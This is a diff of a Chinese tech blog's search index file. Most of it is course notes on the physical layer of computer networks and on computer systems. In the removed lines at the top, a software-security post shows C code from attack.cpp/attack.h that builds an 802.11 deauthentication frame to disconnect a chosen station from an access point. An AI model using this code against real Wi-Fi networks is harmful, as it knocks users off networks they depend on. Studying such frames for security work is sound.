-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#attack.cpp</span></span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">Attack::deauthDevice</span><span class="params">(<span class="keyword">uint8_t</span>* apMac, <span class="keyword">uint8_t</span>* stMac, <span class="keyword">uint8_t</span> reason, <span class="keyword">uint8_t</span> ch)</span> </span>&#123;</span><br><span class="line">	······</span><br><span class="line">    <span class="comment">// build deauth packet</span></span><br><span class="line">    packetSize = <span class="keyword">sizeof</span>(deauthPacket);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">uint8_t</span> deauthpkt[packetSize];</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memcpy</span>(deauthpkt, deauthPacket, packetSize);<span class="comment">//构造mac帧头，初始数据见下</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">memcpy</span>(&amp;deauthpkt[<span class="number">4</span>], stMac, <span class="number">6</span>);</span><br><span class="line">    <span class="built_in">memcpy</span>(&amp;deauthpkt[<span class="number">10</span>], apMac, <span class="number">6</span>);</span><br><span class="line">    <span class="built_in">memcpy</span>(&amp;deauthpkt[<span class="number">16</span>], apMac, <span class="number">6</span>);</span><br><span class="line">    deauthpkt[<span class="number">24</span>] = reason;</span><br><span class="line">    ······</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#attack.h</span></span><br><span class="line"><span class="keyword">uint8_t</span> deauthPacket[<span class="number">26</span>] = &#123;</span><br><span class="line">            <span class="comment">/*  0 - 1  */</span> <span class="number">0xC0</span>, <span class="number">0x00</span>,</span><br><span class="line">            <span class="comment">/*  2 - 3  */</span> <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">            <span class="comment">/*  4 - 9  */</span> <span class="number">0xFF</span>, <span class="number">0xFF</span>, <span class="number">0xFF</span>, <span class="number">0xFF</span>, <span class="number">0xFF</span>, <span class="number">0xFF</span>,</span><br><span class="line">            <span class="comment">/* 10 - 15 */</span> <span class="number">0xCC</span>, <span class="number">0xCC</span>, <span class="number">0xCC</span>, <span class="number">0xCC</span>, <span class="number">0xCC</span>, <span class="number">0xCC</span>,</span><br><span class="line">            <span class="comment">/* 16 - 21 */</span> <span class="number">0xCC</span>, <span class="number">0xCC</span>, <span class="number">0xCC</span>, <span class="number">0xCC</span>, <span class="number">0xCC</span>, <span class="number">0xCC</span>,</span><br><span class="line">            <span class="comment">/* 22 - 23 */</span> <span class="number">0x00</span>, <span class="number">0x00</span>,                         </span><br><span class="line">            <span class="comment">/* 24 - 25 */</span> <span class="number">0x01</span>, <span class="number">0x00</span>                         </span><br><span class="line">        &#125;;</span><br></pre></td></tr></table></figure>
-
-]]></content>
-      <categories>
-        <category>软件安全</category>
-      </categories>
-  </entry>
-  <entry>
     <title>深入理解计算机系统一</title>
     <url>/2021/04/12/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E4%B8%80/</url>
     <content><![CDATA[<h4 id="位："><a href="#位：" class="headerlink" title="位："></a>位：</h4><p>​        计算机中数据储存的基本单位，源程序实际上就是由0和1组成的位序列，8位等于一个字节，系统中的所有信息都是由一串比特位来表示的。</p>
@@ -1692,275 +1735,6 @@
 ]]></content>
       <categories>
         <category>CSAPP</category>
-      </categories>
-  </entry>
-  <entry>
-    <title>物理层</title>
-    <url>/2021/04/26/%E7%89%A9%E7%90%86%E5%B1%82/</url>
-    <content><![CDATA[<h2 id="第二章"><a href="#第二章" class="headerlink" title="第二章"></a>第二章</h2><h4 id="2-1-1-物理层的基本概念"><a href="#2-1-1-物理层的基本概念" class="headerlink" title="2.1.1 物理层的基本概念"></a>2.1.1 物理层的基本概念</h4><h5 id="基本概念："><a href="#基本概念：" class="headerlink" title="基本概念："></a>基本概念：</h5><p>​        物理层解决如何在连接各种计算机的传输媒体上<strong>传输数据比特流</strong>，而不是指具体的传输媒体。</p>
-<p>​        物理层的主要任务：确定与传输媒体<strong>接口</strong>有关的一些特性。=》定义标准</p>
-<ol>
-<li><p>机械特性：定义物理连接的特性，规定物理连接时所采用的<strong>规格</strong>、<strong>接口形状</strong>、<strong>引线数目</strong>、<strong>引脚数量</strong>和<strong>排列情况</strong>。</p>
-</li>
-<li><p>电气特性：规定传输二进制位时，线路上的信号的<strong>电压范围</strong>、<strong>阻抗匹配</strong>、<strong>传输速率</strong>、<strong>距离限制</strong>等。</p>
-</li>
-<li><p>功能特性：指明某条线上出现的<strong>某一电平表示何种意义</strong>，接口部件的信号线的用途。</p>
-<p>例如：描述一个物理层接口引脚处于高电平时的含义等。</p>
-</li>
-<li><p>规程特性：（过程特性）定义各条物理线路的工作规程和时序的关系。</p>
-</li>
-</ol>
-<h4 id="2-1-2-数据通信基础知识"><a href="#2-1-2-数据通信基础知识" class="headerlink" title="2.1.2 数据通信基础知识"></a>2.1.2 数据通信基础知识</h4><h5 id="典型的数据通信模型"><a href="#典型的数据通信模型" class="headerlink" title="典型的数据通信模型"></a>典型的数据通信模型</h5><img src="/2021/04/26/%E7%89%A9%E7%90%86%E5%B1%82/14.png" class="">
-
-<p>源系统：信源，发送器</p>
-<p>传输系统：传输系统</p>
-<p>目的系统：接收器，信宿</p>
-<h5 id="数据通信相关术语"><a href="#数据通信相关术语" class="headerlink" title="数据通信相关术语"></a>数据通信相关术语</h5><p>通信的目的是<strong>传送信息</strong>。</p>
-<p>数据：传送信息的实体，通常是有意义的符号序列</p>
-<p>信号：数据的电气/电磁的表现，是数据在传输过程中的存在形式。</p>
-<p>​    数字信号：代表消息的参数取值是离散的。</p>
-<p>​    模拟信号：代表消息的参数取值是连续的。</p>
-<p>信源：产生和发送数据的源头。</p>
-<p>信宿：接收数据的终点。</p>
-<p>信道：信号的传输媒介。一般用来表示向某一个方向传送信息的介质，因此一条通信线路往往包含一条发送信道和接收信道。</p>
-<img src="/2021/04/26/%E7%89%A9%E7%90%86%E5%B1%82/15.png" class="">
-
-<h5 id="三种通信方式"><a href="#三种通信方式" class="headerlink" title="三种通信方式"></a>三种通信方式</h5><p>从通信双方信息的交互方式来看，可以有三种基本方式：</p>
-<ol>
-<li>单工通信：只有一个方向的通信而没有反方向的交互，仅需要一条信道</li>
-<li>半双工通信：通信的双方都可以发送或接收消息，但任何一方都不能同时发送和接收，需要两条信道</li>
-<li>全双工通信：通信双方可以同时发送和接受信息，也需要两条信道 </li>
-</ol>
-<h5 id="两种数据传输方式"><a href="#两种数据传输方式" class="headerlink" title="两种数据传输方式"></a>两种数据传输方式</h5><p>传输方式：串行传输，并行传输</p>
-<p>​    串行传输：速度慢，费用低，适合远距离</p>
-<img src="/2021/04/26/%E7%89%A9%E7%90%86%E5%B1%82/16.png" class="">
-
-<p>​    并行传输：速度快，费用高，适合近距离（常用于计算机内部的数据传输）</p>
-<img src="C:/Users/86189/blog/source/_posts/17.png"  />
-
-<h4 id="2-1-3-码元、波特、速率、带宽"><a href="#2-1-3-码元、波特、速率、带宽" class="headerlink" title="2.1.3 码元、波特、速率、带宽"></a>2.1.3 码元、波特、速率、带宽</h4><h5 id="码元"><a href="#码元" class="headerlink" title="码元"></a>码元</h5><p>​    指用一个固定时长的信号波形（数字脉冲），代表不同离散值的基本波形，是数字通信中数字信号的计量单位，这个时长内的信号称为k进制码元，而该时长称为码元宽度。当码元的离散状态有M个时（M大于2），此时码元为M进制码元。</p>
-<p>​    1码元可以携带多个比特的信息量。</p>
-<img src="/2021/04/26/%E7%89%A9%E7%90%86%E5%B1%82/18.png" class="">
-
-<p>K进制码元——4进制码元=&gt;码元的离散状态有4个=&gt;4中高低不同的信号波形    00、01、10、11    此时一个码元代表2比特内容</p>
-<h5 id="速率、波特、带宽"><a href="#速率、波特、带宽" class="headerlink" title="速率、波特、带宽"></a>速率、波特、带宽</h5><p><strong>速率</strong>也叫数据率，是指数据的传输速率，表示单位时间内传输的数据量。可以用<strong>码元传输速率</strong>和<strong>信息传输速率</strong>表示。</p>
-<ol>
-<li><strong>码元传输速率</strong>：别名码元速率、波形速率、调制速率、符号速率等。他表示单位时间内数字通信系统所传输的码元个数（也可称为<strong>脉冲个数</strong>或<strong>信号变化的次数</strong>），单位试试<strong>波特（Baud）</strong>。1波特表示数字通信系统每秒传输一个码元。这里的码元可以是多进制的，也可以是二进制的，但码元速率与进制数无关。</li>
-<li><strong>信息传输速率</strong>：别名信息速率、比特率等，表示单位时间内数字通信系统传输的<strong>二进制码元数</strong>（即<strong>比特数</strong>），单位是比特/秒（b/s）</li>
-</ol>
-<p>关系：</p>
-<p>​    若一个码元携带n bit的信息量，则M Baud的<strong>码元传输速率</strong>所对应的<strong>信息传输速率</strong>为M*n bit/s。</p>
-<p><strong>带宽</strong>：表示单位时间内从网络中的某一点到另一点所能通过的“<strong>最高数据率</strong>”，常用来表示网络的通信线路所能传输数据的能力。单位b/s。</p>
-<h4 id="2-1-4-奈氏准则和香农定理"><a href="#2-1-4-奈氏准则和香农定理" class="headerlink" title="2.1.4 奈氏准则和香农定理"></a>2.1.4 奈氏准则和香农定理</h4><h5 id="失真："><a href="#失真：" class="headerlink" title="失真："></a>失真：</h5><img src="/2021/04/26/%E7%89%A9%E7%90%86%E5%B1%82/19.png" class="">
-
-<p>影响失真程度的因素：</p>
-<ol>
-<li>码元传输速率</li>
-<li>信号传输距离</li>
-<li>噪声干扰</li>
-<li>传输媒体质量</li>
-</ol>
-<h5 id="失真的一种现象–码间串扰"><a href="#失真的一种现象–码间串扰" class="headerlink" title="失真的一种现象–码间串扰"></a>失真的一种现象–码间串扰</h5><img src="/2021/04/26/%E7%89%A9%E7%90%86%E5%B1%82/20.png" class="">
-
-<p>信号带宽是信道能通过的<strong>最高频率</strong>和<strong>最低频率</strong>之差</p>
-<p><strong>码间串扰</strong>：<strong>接收端</strong>收到的信号波形失去了码元之间清晰界限的现象</p>
-<h5 id="奈式准则："><a href="#奈式准则：" class="headerlink" title="奈式准则："></a><strong>奈式准则</strong>：</h5><p>​    在理想低通（无噪声，宽带受限）条件下，为了避免码间串扰，<strong>极限码元传输速率</strong>为2W Baud， W是信道带宽，单位是Hz。</p>
-<p><strong>极限数据传输率</strong> :</p>
-<img src="/2021/04/26/%E7%89%A9%E7%90%86%E5%B1%82/21.png" class="">
-
-<p>​    传输速率慢：那么我们可以清晰识别每一个码元。</p>
-<p>​    传输速率快：因为码间串扰，所有不能清晰识别。</p>
-<ol>
-<li>信道的频带越宽（即通过的信号高频分量越多），就可以用更高的速率进行码元的有效传输。</li>
-<li>奈式准则给出了马原传输速率的限制，但并没有对信息传输速率给出限制。</li>
-<li>由于码元传输速率受到奈氏准则的制约，所以要提高数据的传输速率，就必须设法使每个码元都能携带更多比特的信息量，这就需要多元制的调制方法。</li>
-</ol>
-<h5 id="香农定理："><a href="#香农定理：" class="headerlink" title="香农定理："></a>香农定理：</h5><p>​    在带宽受限且有噪声的信道中，为了不产生误差，信息的数据传输速率有上限值。</p>
-<p><strong>噪声</strong>：存在于所有的电子设备和通信信道中。由于噪声<strong>随机产生</strong>，它的瞬时值有时会很大，因此噪声会使接收端对码元的判决产生错误。但是噪声的影响是相对的，若信号较强，那么噪声的影响就相对较小。因此，<strong>信噪比</strong>就很重要。</p>
-<p>信噪比=信号的平均功率/噪声的平均功率。常记作S/N，并用分贝（dB）作为度量单位，即：</p>
-<p>​    信噪比（dB）= 10log10（S/N）</p>
-<p>信道的极限数据传输速率：</p>
-<img src="/2021/04/26/%E7%89%A9%E7%90%86%E5%B1%82/22.png" class="">
-
-<ol>
-<li>信道的带宽或者信道中的信噪比越大，则信息的极限传输速率越高。</li>
-<li>对一定的传输带宽和一定打的信噪比，信息传输速率的上限就确定了。</li>
-<li>只要信息的传输速率低于信道的极限传输速率，就一定能找到某种方法来实现无差错的传输。</li>
-<li>香农定理得出的为极限信息传输速率，实际信道能达到的传输速率要比它低不少。</li>
-<li>从香农定理可以看出，若信道带宽W或信噪比S/N没有上限（不可能），那么信道的极限信息传输速率也就没有上限。</li>
-</ol>
-<img src="/2021/04/26/%E7%89%A9%E7%90%86%E5%B1%82/23.png" class="">
-
-<h4 id="2-1-5-编码与调制"><a href="#2-1-5-编码与调制" class="headerlink" title="2.1.5 编码与调制"></a>2.1.5 编码与调制</h4><h5 id="基带信号与宽带信号"><a href="#基带信号与宽带信号" class="headerlink" title="基带信号与宽带信号"></a>基带信号与宽带信号</h5><p>信道：信号的传输媒介。一般用来表示向某一个方向传送信息的介质，因此一条信道线路往往包含一条发送信道和一条接收信道。</p>
-<img src="/2021/04/26/%E7%89%A9%E7%90%86%E5%B1%82/24.png" class="">
-
-<p>信道上传输的信号：</p>
-<ul>
-<li><p>基带信号</p>
-<p>将数字信号1和0直接用两种不同的电压表示，再送到数字信道上去传输（基带传输）。<strong>来自信源的信号</strong>，像计算机输出的代表各种文字或图像文件的数据信号都属于基带信号。基带信号就是<strong>发出了直接表达要传输的信息的信号</strong>。</p>
-</li>
-<li><p>宽带信号</p>
-<p>将基带信号进行调制后形成的频分复用模拟信号，再传送到<strong>模拟信道</strong>上去传输（宽带传输）。把基带信号经过<strong>载波调制</strong>后，把信号的频率范围搬移到较高的频段以便于再信道中传播。</p>
-</li>
-</ul>
-<p>传输距离较近时，采用基带传输方式</p>
-<p>传输距离较近时，采用宽带传输方式</p>
-<h5 id="编码与调制"><a href="#编码与调制" class="headerlink" title="编码与调制"></a>编码与调制</h5><img src="/2021/04/26/%E7%89%A9%E7%90%86%E5%B1%82/25.png" class="">
-
-<h6 id="数字数据编码为数字信号"><a href="#数字数据编码为数字信号" class="headerlink" title="数字数据编码为数字信号"></a>数字数据编码为数字信号</h6><img src="/2021/04/26/%E7%89%A9%E7%90%86%E5%B1%82/26.png" class="">
-
-<ol>
-<li><p><strong>非归零编码（NRZ）</strong></p>
-<p>高1低0：编码容易实现，但没有检错功能，且无法判断一个码元的开始和结束，以至于收发双方<strong>难以保持同步</strong></p>
-<img src="/2021/04/26/%E7%89%A9%E7%90%86%E5%B1%82/27.png" class=""></li>
-<li><p><strong>曼彻斯特编码</strong></p>
-<p>将一个码元分成两个相等的间隔，前一个间隔为低电平后一个间隔为高电平表示码元1；码元0正好相反。也可以采用相反的规定。该编码的特点是在每一个码元的中间出现电平跳变，位中间的跳变<strong>即作时钟信号，又作数据信号</strong>，但它所占的频带宽度是原始基带宽度的两倍。</p>
-<img src="/2021/04/26/%E7%89%A9%E7%90%86%E5%B1%82/30.png" class="">
-
-<p>​    每一个码元都被调成两个电平，数据传输速率只有<strong>调制速率</strong>（码元传输速率）的1/2。</p>
-</li>
-<li><p><strong>差分曼彻斯特编码</strong></p>
-<p>同1异0</p>
-<p>若码元为1，则前半个码元的电平与上一个码元后半个码元的电平相同。若为0，则相反。特点是：在每个码元的中间，都有一次电平的跳转，可以实现自同步，且抗干扰性强于曼彻斯特编码。</p>
-<img src="/2021/04/26/%E7%89%A9%E7%90%86%E5%B1%82/31.png" class=""></li>
-<li><p>归零编码（RZ）</p>
-<p>信号电平在一个码元之内都要恢复到零的这种编码方式</p>
-<img src="/2021/04/26/%E7%89%A9%E7%90%86%E5%B1%82/28.png" class=""></li>
-<li><p>反向不归零编码（NRZI）</p>
-<p>信号电平翻转表示0，信号电平不变表示1</p>
-<img src="/2021/04/26/%E7%89%A9%E7%90%86%E5%B1%82/29.png" class=""></li>
-<li><p>4B/5B编码</p>
-<p>比特流中插入额外的比特以打破一连串的0或1，就是5个比特来编码4个比特的数据，之后再传给接收方，因此称为4B/5B。编码效率是80%。</p>
-<p>只采用16钟不同的4位码，其他的16种作为控制码或保留。</p>
-</li>
-</ol>
-<h6 id="数字数字调制为模拟信号"><a href="#数字数字调制为模拟信号" class="headerlink" title="数字数字调制为模拟信号"></a>数字数字调制为模拟信号</h6><p>数字数据调制技术在发送端将数字信号转换为模拟信号，而在接收端将模拟信号还原为数字信号，分别对应于调制解调器的调制和解调过程。</p>
-<img src="/2021/04/26/%E7%89%A9%E7%90%86%E5%B1%82/32.png" class="">
-
-<p>调幅+调相（QAM）</p>
-<h6 id="模拟数据编码为数字信号"><a href="#模拟数据编码为数字信号" class="headerlink" title="模拟数据编码为数字信号"></a>模拟数据编码为数字信号</h6><p>计算机内部处理的是二进制数据，处理的都是数字音频，所有需要将模拟音频通过采样、量化转化成有限个数字表示的离散序列（即实现音频数字化）</p>
-<p>最典型的例子就是对音频信号进行编码的<strong>脉码调制（PCM）</strong>，在计算机应用种，能够达到最高保真水平的就是PCM编码，被广泛用于素材保存及音乐欣赏，CD、DVD以及我们常见的WAV文件中均有应用。它主要包括三步：<strong>抽样、量化、编码</strong></p>
-<ol>
-<li><p>抽样：对模拟信号周期性扫描，把时间上连续的信号变成时间上离散的信号。</p>
-<p>采样定理：<img src="/2021/04/26/%E7%89%A9%E7%90%86%E5%B1%82/33.png" class=""></p>
-</li>
-<li><p>量化：把抽样取得的电平幅值按照一定的分级标度转化为对应的数字值，并取整数，这就把连续的电平幅值转化为离散的数字量。</p>
-</li>
-<li><p>编码：把量化的结果转化为与之对应的二进制编码</p>
-</li>
-</ol>
-<img src="/2021/04/26/%E7%89%A9%E7%90%86%E5%B1%82/34.png" class="">
-
-<h6 id="模拟数据调制为模拟信号"><a href="#模拟数据调制为模拟信号" class="headerlink" title="模拟数据调制为模拟信号"></a>模拟数据调制为模拟信号</h6><p>为了实现传输有效性，可能需要较高的频率。这种调制方式还可以使用频分复用技术，充分利用带宽资源。在电话机和本地交换机所传输的信号是采用模拟信号传输模拟数据的方式：模拟的声音数据是加载到模拟的载波信号中传输的。</p>
-<h5 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h5><img src="/2021/04/26/%E7%89%A9%E7%90%86%E5%B1%82/35.png" class="">
-
-<h4 id="2-2-物理层传输介质"><a href="#2-2-物理层传输介质" class="headerlink" title="2.2 物理层传输介质"></a>2.2 物理层传输介质</h4><h5 id="传输介质及分类"><a href="#传输介质及分类" class="headerlink" title="传输介质及分类"></a>传输介质及分类</h5><p>​    传输介质也称传输媒体/传输媒介，它就是数据传输系统中在发送设备和接收设备之间的<strong>物理通路</strong>。</p>
-<p>传输媒体并不是物理层：</p>
-<p>传输媒体在物理层的下面，因为物理层是体系结构的第一层，因此有时称传输媒体为0层。在传输媒体中传输的是信号，但传输媒体并不知道所传输的信号代表什么意思。但物理层规定了<strong>电气特性</strong>，因此能够识别所传送的比特流。</p>
-<p>传输介质：</p>
-<ul>
-<li>导向性传输介质-&gt;电磁波被导向固体媒介（铜线/光纤）传播。</li>
-<li>非导向性传输介质-&gt;自由空间，介质可以是空气、真空、海水等。</li>
-</ul>
-<h5 id="导向性传输介质–1-双绞线"><a href="#导向性传输介质–1-双绞线" class="headerlink" title="导向性传输介质–1.双绞线"></a>导向性传输介质–1.双绞线</h5><p>双绞线是古老、又最常用的传输介质，它由<strong>两根</strong>采用一定规则<strong>并排绞合</strong>的、<strong>相互绝缘</strong>的<strong>铜导线</strong>组成。</p>
-<img src="/2021/04/26/%E7%89%A9%E7%90%86%E5%B1%82/36.png" class="">
-
-<p>绞合可以减少相邻导线的电磁干扰。</p>
-<p>为了进一波提高抗电磁干扰能力，可在双绞线的外面再加上一个由金属丝编织成的屏蔽层，这就是<strong>屏蔽双绞线（SIP）</strong>，无屏蔽层的双绞线就称为<strong>非屏蔽双绞线（UTP）</strong>。</p>
-<p>特点：</p>
-<ul>
-<li>双绞线价格便宜，是最常用的传输介质之一，在局域网和传统电话网中普遍使用。</li>
-<li>模拟传输和数字传输都可以使用双绞线，其通信距离一般为几公里到十公里。</li>
-<li>距离太远时，对于<strong>模拟传输</strong>，要用<strong>放大器</strong>放大衰减的信号；对于<strong>数字传输</strong>，要用<strong>中继器</strong>将失真的信号整形。</li>
-</ul>
-<h5 id="导向性传输介质–2-同轴电缆"><a href="#导向性传输介质–2-同轴电缆" class="headerlink" title="导向性传输介质–2.同轴电缆"></a>导向性传输介质–2.同轴电缆</h5><p>同轴电缆由导体<strong>铜质芯线</strong>、<strong>绝缘层</strong>、<strong>网状编织屏蔽层</strong>和<strong>塑料外层</strong>构成。按特性阻抗数值的不同，通常将同轴电缆分为两类；50Ω同轴电缆和75Ω同轴电缆。其中，50Ω同轴电缆主要用于传送基带数字信号，又称为<strong>基带同轴电缆</strong>，它在局域网中得到广泛应用；75Ω同轴电缆主要用于传送宽带信号，又称为<strong>宽带同轴电缆</strong>，它主要用于有线电视系统。</p>
-<img src="/2021/04/26/%E7%89%A9%E7%90%86%E5%B1%82/37.png" class="">
-
-<p>由于外导体屏蔽层的作用，同轴电缆<strong>抗干扰特性</strong>比双绞线好，被广泛用于传输较高速率的数据，其传输距离更远，但价格比双绞线贵。</p>
-<h5 id="导向性传输介质–3-光纤"><a href="#导向性传输介质–3-光纤" class="headerlink" title="导向性传输介质–3.光纤"></a>导向性传输介质–3.光纤</h5><p>光纤通信就是利用光导纤维（简称光纤）传递<strong>光脉冲</strong>来进行通信。有光脉冲为1，无光脉冲为0.而可见光的频率大约为<strong>10的8次方MHz</strong>，因此光纤通信系统的<strong>带宽远远大于</strong>目前其他各种传输媒体的带宽。</p>
-<p>光纤主要由<strong>纤芯</strong>（<strong>实心的！</strong>）和<strong>包层</strong>构成，光波通过纤芯进行传导，包层较纤芯有较低的折射率。当光线从高折射率的介质射向低折射率的介质时，其折射角将大于入射角。因此，当入射角够大就会出现<strong>全反射</strong>，即光线碰到包层时候就会折射回纤芯、这个过程不断重复，光也就沿着光纤传输下去。</p>
-<img src="/2021/04/26/%E7%89%A9%E7%90%86%E5%B1%82/38.png" class="">
-
-<img src="/2021/04/26/%E7%89%A9%E7%90%86%E5%B1%82/39.png" class="">
-
-<img src="/2021/04/26/%E7%89%A9%E7%90%86%E5%B1%82/40.png" class="">
-
-<p>光缆：一根光缆少则只有一根光纤，多则包括十到数百根光纤。</p>
-<p>光纤的特点：</p>
-<ol>
-<li>传输<strong>损耗小</strong>，中继距离长，对远距离传输特别经济</li>
-<li><strong>抗雷电和电磁干扰性能好</strong></li>
-<li>无串音干扰，保密性好，也<strong>不易被窃听或截取数据</strong></li>
-<li><strong>体积小，重量轻。</strong></li>
-</ol>
-<h5 id="非导向性传输介质："><a href="#非导向性传输介质：" class="headerlink" title="非导向性传输介质："></a>非导向性传输介质：</h5><ul>
-<li><p>无线单波</p>
-<ul>
-<li>信号向所有方向传播</li>
-<li>较强的穿透能力，可远距离传输，广泛用于通信领域（手机通信）</li>
-</ul>
-</li>
-<li><p>微波</p>
-<ul>
-<li><p>信号固定方向传播</p>
-</li>
-<li><p>微波通信频率较高、频段范围宽，因此数据率很高。</p>
-<ul>
-<li><p>地面微波接力通信</p>
-</li>
-<li><p>卫星通信</p>
-<ul>
-<li>优点：</li>
-</ul>
-<ol>
-<li>通信容量大</li>
-<li>距离远</li>
-<li>覆盖范围广</li>
-<li>广播通信和多址通信</li>
-</ol>
-<ul>
-<li>缺点：</li>
-</ul>
-<ol>
-<li>传播时延长</li>
-<li>受天气影响大</li>
-<li>误码率高</li>
-<li>成本高</li>
-</ol>
-</li>
-</ul>
-</li>
-</ul>
-</li>
-<li><p>红外线、激光</p>
-<ul>
-<li>信号固定方向传播</li>
-<li>把要传输的信号转换为各自的信号格式，即红外光信号和激光信号。再在空间中传播。</li>
-</ul>
-</li>
-</ul>
-<h5 id="总结-1"><a href="#总结-1" class="headerlink" title="总结"></a>总结</h5><img src="/2021/04/26/%E7%89%A9%E7%90%86%E5%B1%82/41.png" class="">
-
-<h4 id="2-3-物理层设备"><a href="#2-3-物理层设备" class="headerlink" title="2.3 物理层设备"></a>2.3 物理层设备</h4><h4 id="中继器"><a href="#中继器" class="headerlink" title="中继器"></a>中继器</h4><p><strong>诞生原因：</strong>由于存在损耗，在线路上传输的信号功率会逐渐衰减，衰减到一定程度将造成信号失真，因此会导致接收错误。</p>
-<p><strong>中继器功能：</strong>对信号进行再生和还原，对衰减的信号进行放大，保持与原数据相同，以增加信号传输的距离，延长网络的长度。（再生数字信号）</p>
-<p><strong>中继器的两端：</strong></p>
-<ol>
-<li>两端的网络部分是网段，而不是子网，适用于完全相同的两类网络的互连，且两个网段速率要相同。</li>
-<li>中继器只将任何电缆段上的数据发送到另一段电缆上，它仅作用于信号的电气部分，并不管数据中是否有错误数据或不适用于网段的数据</li>
-<li>两端可连相同媒体，也可连不同媒体</li>
-<li>中继器两端的网段一定要是同一个协议（不会存储转发）</li>
-</ol>
-<p><strong>5-4-3规则：</strong></p>
-<p>网络标准中都对信号的延迟范围作了具体的规定，因而中继器只能在规定的范围内进行，否则会网络故障。</p>
-<p>5个网段，4个物理层网络设备，只有三个网段可以连接计算机。</p>
-<h4 id="集线器（多口中继器）"><a href="#集线器（多口中继器）" class="headerlink" title="集线器（多口中继器）"></a>集线器（多口中继器）</h4><p><strong>功能</strong>：对信号进行<strong>放大转发</strong>，对衰减的信号进行放大，接着转发到其他所有（除输入端口外）处于工作状态的端口上，以增加信号传输的距离，延长网络的长度。不具备信号的定向传送能力，是一个共享式设备。</p>
-<img src="/2021/04/26/%E7%89%A9%E7%90%86%E5%B1%82/42.png" class="">
-
-<p>集线器不能分割冲突域</p>
-<p>连在集线器上的工作主机平分带宽。</p>
-]]></content>
-      <categories>
-        <category>计算机网络</category>
       </categories>
   </entry>
   <entry>
@@ -2584,6 +2358,275 @@
 <p>​            <strong>面向连接</strong>：第一是建立连接，发出一个建立连接的请求。第二阶段开始传输数据。最后传输完毕，必须释放连接。</p>
 <p>​            <strong>无连接</strong>：直接进行数据传输。</p>
 <h5 id="五层参考模型"><a href="#五层参考模型" class="headerlink" title="五层参考模型"></a>五层参考模型</h5><h5 id=""><a href="#" class="headerlink" title=""></a><img src="/2021/04/01/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E7%BB%AA%E8%AE%BA/12.png" class=""></h5><h4 id="5层参考模型的数据封装与解封装"><a href="#5层参考模型的数据封装与解封装" class="headerlink" title="5层参考模型的数据封装与解封装"></a>5层参考模型的数据封装与解封装</h4><img src="/2021/04/01/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E7%BB%AA%E8%AE%BA/13.png" class="">
+]]></content>
+      <categories>
+        <category>计算机网络</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>物理层</title>
+    <url>/2021/04/26/%E7%89%A9%E7%90%86%E5%B1%82/</url>
+    <content><![CDATA[<h2 id="第二章"><a href="#第二章" class="headerlink" title="第二章"></a>第二章</h2><h4 id="2-1-1-物理层的基本概念"><a href="#2-1-1-物理层的基本概念" class="headerlink" title="2.1.1 物理层的基本概念"></a>2.1.1 物理层的基本概念</h4><h5 id="基本概念："><a href="#基本概念：" class="headerlink" title="基本概念："></a>基本概念：</h5><p>​        物理层解决如何在连接各种计算机的传输媒体上<strong>传输数据比特流</strong>，而不是指具体的传输媒体。</p>
+<p>​        物理层的主要任务：确定与传输媒体<strong>接口</strong>有关的一些特性。=》定义标准</p>
+<ol>
+<li><p>机械特性：定义物理连接的特性，规定物理连接时所采用的<strong>规格</strong>、<strong>接口形状</strong>、<strong>引线数目</strong>、<strong>引脚数量</strong>和<strong>排列情况</strong>。</p>
+</li>
+<li><p>电气特性：规定传输二进制位时，线路上的信号的<strong>电压范围</strong>、<strong>阻抗匹配</strong>、<strong>传输速率</strong>、<strong>距离限制</strong>等。</p>
+</li>
+<li><p>功能特性：指明某条线上出现的<strong>某一电平表示何种意义</strong>，接口部件的信号线的用途。</p>
+<p>例如：描述一个物理层接口引脚处于高电平时的含义等。</p>
+</li>
+<li><p>规程特性：（过程特性）定义各条物理线路的工作规程和时序的关系。</p>
+</li>
+</ol>
+<h4 id="2-1-2-数据通信基础知识"><a href="#2-1-2-数据通信基础知识" class="headerlink" title="2.1.2 数据通信基础知识"></a>2.1.2 数据通信基础知识</h4><h5 id="典型的数据通信模型"><a href="#典型的数据通信模型" class="headerlink" title="典型的数据通信模型"></a>典型的数据通信模型</h5><img src="/2021/04/26/%E7%89%A9%E7%90%86%E5%B1%82/14.png" class="">
+
+<p>源系统：信源，发送器</p>
+<p>传输系统：传输系统</p>
+<p>目的系统：接收器，信宿</p>
+<h5 id="数据通信相关术语"><a href="#数据通信相关术语" class="headerlink" title="数据通信相关术语"></a>数据通信相关术语</h5><p>通信的目的是<strong>传送信息</strong>。</p>
+<p>数据：传送信息的实体，通常是有意义的符号序列</p>
+<p>信号：数据的电气/电磁的表现，是数据在传输过程中的存在形式。</p>
+<p>​    数字信号：代表消息的参数取值是离散的。</p>
+<p>​    模拟信号：代表消息的参数取值是连续的。</p>
+<p>信源：产生和发送数据的源头。</p>
+<p>信宿：接收数据的终点。</p>
+<p>信道：信号的传输媒介。一般用来表示向某一个方向传送信息的介质，因此一条通信线路往往包含一条发送信道和接收信道。</p>
+<img src="/2021/04/26/%E7%89%A9%E7%90%86%E5%B1%82/15.png" class="">
+
+<h5 id="三种通信方式"><a href="#三种通信方式" class="headerlink" title="三种通信方式"></a>三种通信方式</h5><p>从通信双方信息的交互方式来看，可以有三种基本方式：</p>
+<ol>
+<li>单工通信：只有一个方向的通信而没有反方向的交互，仅需要一条信道</li>
+<li>半双工通信：通信的双方都可以发送或接收消息，但任何一方都不能同时发送和接收，需要两条信道</li>
+<li>全双工通信：通信双方可以同时发送和接受信息，也需要两条信道 </li>
+</ol>
+<h5 id="两种数据传输方式"><a href="#两种数据传输方式" class="headerlink" title="两种数据传输方式"></a>两种数据传输方式</h5><p>传输方式：串行传输，并行传输</p>
+<p>​    串行传输：速度慢，费用低，适合远距离</p>
+<img src="/2021/04/26/%E7%89%A9%E7%90%86%E5%B1%82/16.png" class="">
+
